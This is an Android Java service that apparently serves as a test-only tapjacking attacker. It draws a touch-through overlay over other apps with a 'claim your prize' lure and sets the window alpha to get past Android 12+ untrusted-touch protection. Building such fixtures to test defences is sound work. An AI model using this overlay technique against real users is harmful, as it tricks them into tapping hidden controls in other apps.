package com.tapjackos.attacker;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;

/**
 * Test-only "attacker": draws a TYPE_APPLICATION_OVERLAY window that lets touches fall
 * through to whatever app is underneath, which is exactly what tapjacking relies on.
 * Runs as a foreground service so the overlay survives while the victim app is in front.
 */
public class OverlayService extends Service {

    static final String EXTRA_ALPHA = "alpha";
    static final String EXTRA_PARTIAL = "partial";

    private static final String TAG = "OverlayAttacker";
    private static final String CHANNEL_ID = "overlay";
    private static final int NOTIFICATION_ID = 1;

    private View overlay;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startInForeground();
        if (!Settings.canDrawOverlays(this)) {
            Log.w(TAG, "Overlay permission not granted");
            stopSelf();
            return START_NOT_STICKY;
        }
        float alpha = intent != null ? intent.getFloatExtra(EXTRA_ALPHA, 1f) : 1f;
        boolean partial = intent != null && intent.getBooleanExtra(EXTRA_PARTIAL, false);
        showOverlay(alpha, partial);
        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        removeOverlay();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void showOverlay(float alpha, boolean partial) {
        removeOverlay();

        TextView view = new TextView(this);
        view.setText(partial ? "PARTIAL OVERLAY" : "TAP ANYWHERE TO CLAIM YOUR PRIZE");
        view.setTextColor(Color.WHITE);
        view.setTextSize(22);
        view.setGravity(Gravity.CENTER);
        view.setBackgroundColor(Color.rgb(200, 30, 60));

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                partial ? getResources().getDisplayMetrics().heightPixels / 4
                        : WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                // NOT_TOUCHABLE: touches pass through to the app below.
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                        | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.TOP;
        // Window alpha is what Android 12+ untrusted-touch occlusion looks at (<= 0.8 is let through).
        params.alpha = alpha;

        getSystemService(WindowManager.class).addView(view, params);
        overlay = view;
        Log.i(TAG, "Overlay shown (alpha=" + alpha + ", partial=" + partial + ")");
    }

    private void removeOverlay() {
        if (overlay != null) {
            getSystemService(WindowManager.class).removeView(overlay);
            overlay = null;
        }
    }

    private void startInForeground() {
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(
                new NotificationChannel(CHANNEL_ID, "Overlay", NotificationManager.IMPORTANCE_LOW));
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setContentTitle("Overlay attacker running")
                .build();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    static Intent intent(Context context, float alpha, boolean partial) {
        return new Intent(context, OverlayService.class)
                .putExtra(EXTRA_ALPHA, alpha)
                .putExtra(EXTRA_PARTIAL, partial);
    }
}
